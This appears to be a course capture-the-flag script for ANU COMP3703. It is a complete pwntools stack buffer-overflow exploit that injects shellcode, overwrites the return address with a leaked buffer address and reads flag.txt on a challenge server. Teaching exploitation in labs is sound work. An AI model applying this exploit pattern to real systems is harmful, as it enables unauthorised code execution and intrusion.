#!/usr/bin/env python3

# ANU COMP3703 - sample CTF problem 
#
# This template python script is provided to help you interact with 
# with the challenge server. You do not have to use this script template; feel
# free to write your own if you'd like. 
# 
# The binary in this challenge interacts only through the standard input,
# so all payload must be input through the standard input (e.g., keyboard).
# This means that non-printable characters (e.g., the null byte) will need
# to be inputted programmatically. 
#
# This will be done using the pwn library pwnlib.tubes.process. See  
#   https://docs.pwntools.com/en/stable/tubes/processes.html
# if you are interested in more details of this librarry. 


from pwn import *
import argparse


def solve(ip,port): 
    progname = "./shell0"
    
    # You can emulate the remote process locally, using 'process' instead of
    # 'remote' to launch the program. 
    # You should first test your solution locally before testing it on the
    # challenge server. 

    if ip == '': 
        p = process([progname]) # launch the process locally
    else:
        p = remote(ip, port)    # interact with the remote server 


    context.arch = 'amd64'

    print(p.recvline())
    print(p.recvline())
    str=p.recvline()
    str=str[:-1]
    buffer_addr = int(str,16)
    print("Buffer address: " + hex(buffer_addr))

    # Here's a simple shellcode to execute the command 'cat flag.txt' on
    # the challenge server to print the flag. This uses the 'shellcraft' 
    # library of pwntools; see
    #  https://docs.pwntools.com/en/stable/shellcraft.html
    # 
    shellcode = asm(shellcraft.amd64.linux.cat('flag.txt'))

    # The command p.recvline() will receive a line (a string terminated 
    # with a newline) from the server. 
    # Use as many recvline as necessary to receive the expected output of the 
    # program. For this example, the program prints two lines, before accepting
    # outputting the buffer address that we are interested in.  
    # print(p.recvline())
    # print(p.recvline())

    # # The next output of the program is the buffer address. Store this
    # # in a variable and convert it to an integer. 
    # str=p.recvline()
    # str=str[:-1]  # remove the new line character
    # buffer_addr = int(str,16)
    # print("My Buffer address: " + hex(buffer_addr))

    # ===== Start of your exploit code ===================

    ret_offset = 0x58

    print("shell code len: %d" % len(shellcode))

    # Craft your payload here. 
    content = shellcode
    content += b'a' * (ret_offset - len(content))
    content += p64(buffer_addr)
    content += b'b' * (0x100 - len(content))

    with open('badfile', 'wb') as outf:
      outf.write(content)

    # ===== End of your exploit code  ====================

    # send your payload to the challenge serve
    p.send(content)

    # receive the response; if all goes well you will see the flag printed.
    print(p.recvall())


def main(): 
    # If the option --ip is not provided, launch the process locally. 
    # To interact with the challenge server, specify the IP address of the server using --ip. 
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', dest='ip_addr', default='', 
                      help='ip address of challenge server')

    args = parser.parse_args()
    
    solve(args.ip_addr, 61337)

if __name__ == '__main__':
    main()
